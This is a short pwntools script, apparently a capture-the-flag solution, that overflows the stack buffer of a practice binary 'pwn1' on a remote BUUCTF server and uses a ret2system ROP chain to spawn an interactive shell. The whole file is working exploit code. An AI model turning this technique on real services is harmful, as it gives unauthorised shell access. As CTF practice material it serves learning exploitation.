# method two

from pwn import *


# p = process("./pwn1")
p = remote("node4.buuoj.cn", 26231)
pro = ELF("./pwn1")

system = pro.plt["system"]
binsh = next(pro.search(b"/bin/sh\00"))
pop_rdi_ret = 0x00000000004011fb
ret = pop_rdi_ret + 1

# ret to system
# the ```p64(ret)``` is to avoid ```movaps```
payload = cyclic(0xf+0x8)
payload += p64(ret)+p64(pop_rdi_ret)+p64(binsh)+p64(system)
p.sendline(payload)

p.interactive()

